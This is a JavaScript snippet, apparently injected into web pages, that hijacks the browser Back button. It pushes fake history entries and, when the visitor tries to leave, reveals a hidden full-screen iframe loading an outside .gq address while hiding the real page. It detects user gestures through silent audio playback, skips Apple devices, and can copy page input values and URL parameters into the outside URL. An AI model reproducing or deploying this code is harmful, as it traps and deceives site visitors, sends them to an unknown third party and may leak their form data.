(function () { const Url =  "https://teliholwaloh.gq/jXXY2hcp";

     const Depth = 2,
      ReloadStreamUUID = 'cb64f855-1095-43ea-b0a0-cd26d15a3bf5',
      backlink = replaceMacros(Url);

  var redFlag = false,
      disabled = false;

      
          disabled = (document.cookie.indexOf('disableBackfix') !== -1);
  document.addEventListener("DOMContentLoaded", function () {
      document.querySelectorAll("form").forEach(function (value) {
          value.addEventListener("submit", function () {
              disabled = true;
              document.cookie = 'disableBackfix=1;expires=' + (new Date(Date.now() + 60 * 5 * 1000)).toGMTString();
          });
      });
  });
  
      if (document.readyState === 'complete' || document.readyState === 'loaded' || document.readyState === 'interactive') {
      brave();
  } else {
      document.addEventListener("DOMContentLoaded", brave);
  }

  function brave() {
              if (disabled === true) {
          return;
      }

      var links = document.getElementsByTagName('a');

      for (var i = 0; i < links.length; i++) {
          links[i].addEventListener("click", function () {
              redFlag = true;
          });
      }

      backInFrame(backlink);
  }

  function replaceMacros(backLink) {
      const DefaultMacroValue = 'unknown',
          regexpQueryParams = /(\w+)=\[(.+?)]/g,
          regexpDocumentInputs = /input\[(.+?)]/g;

      try {
          var url = new URL(location.href);

          backLink = backLink.replace(regexpQueryParams, function (all, replaceQueryParamName, urlQueryParamName) {
              var value;

              value = url.searchParams.has(urlQueryParamName)
                  ? url.searchParams.get(urlQueryParamName)
                  : DefaultMacroValue;

              const IsParamStream = replaceQueryParamName === "stream_uuid",
                  IsParamValueUUIDv4 = /^[0-9A-F]{8}-[0-9A-F]{4}-[4][0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i.test(value) === true,
                  IsReplaceStreamEnabled = false;

                              if (IsParamStream && !(IsReplaceStreamEnabled && IsParamValueUUIDv4)) {
                  value = ReloadStreamUUID;
              }

              return replaceQueryParamName + "=" + value;
          });

          backLink = backLink.replace(regexpDocumentInputs, function (all, key) {
              var inputs = document.querySelectorAll("input[name=" + key + "]");

              if (inputs.length === 1) {
                  return inputs[0].value;
              }

              return DefaultMacroValue;
          });

          return backLink;
      } catch (err) {
          console.error(err);
          return backLink;
      }
  }

  function backInFrame(backLink) {
      var frame = document.createElement('iframe');
      frame.style.width = '100%';
      frame.id = 'domonet';
      frame.name = 'domonet';
      frame.style.height = '100vh';
      frame.style.position = 'fixed';
      frame.style.top = 0;
      frame.style.left = 0;
      frame.style.border = 'none';
      frame.style.zIndex = 999997;
      frame.style.display = 'none';
      frame.style.backgroundColor = '#fff';
      frame.setAttribute("src", backLink);

      for (var t = 0; Depth > t; ++t) window.history.pushState({}, '', window.location.href + '#' + t);

      if (!isIos()) {
          checkUserGesture(function () {
              for (var t = 0; Depth > t; ++t) window.history.pushState({}, '', window.location.href + '#' + t);
          });
      }

      document.body.append(frame);

      window.onpopstate = function (t) {
          setTimeout(
              function () {
                  if (redFlag === true) {
                      redFlag = false;
                      return;
                  }

                  if (disabled === true) {
                                              history.go(-Depth);
                      return;
                  }

                  if (getUrlVar('frame') === 1 || isInIframe()) return;

                  if (!isIos() && !!!t.state) return;

                  document.body.style.overflow = 'hidden';
                  frame.style.display = "block";
                                                          document.querySelectorAll("body > *:not(#domonet)").forEach(function (e) {
                      e.setAttribute('style', 'display:none;');
                  });
              },
              10
          );
      };
  }

  function getUrlVar(key) {
      var p = window.location.search;
      p = p.match(new RegExp('[?&]{1}(?:' + key + '=([^&$#=]+))'));
      return p ? p[1] : '';
  }

  function isInIframe() {
      try {
          return window != window.top || document != top.document || self.location != top.location;
      } catch (e) {
          return true;
      }
  }

  function checkUserGesture(callback) {
      var st = setInterval(function () {
          var audio = document.createElement('audio');
          var playPromise = audio.play();
          if (playPromise instanceof Promise) {
              if (!audio.paused) {
                  clearInterval(st);
                  callback();
              }
              playPromise.then(function (e) {

              }).catch(function (error) {

              });
          } else {
              if (!audio.paused) {
                  clearInterval(st);
                  callback();
              }
          }
      }, 100);
  }

  function isIos() {
      return [
          'iPad Simulator',
          'iPhone Simulator',
          'iPod Simulator',
          'iPad',
          'iPhone',
          'iPod',
          'Macintosh',
          'MacIntel',
          'MacPPC',
          'Mac68K',
          'Mac68K'
      ].indexOf(navigator.platform) !== -1;
  }
})(window);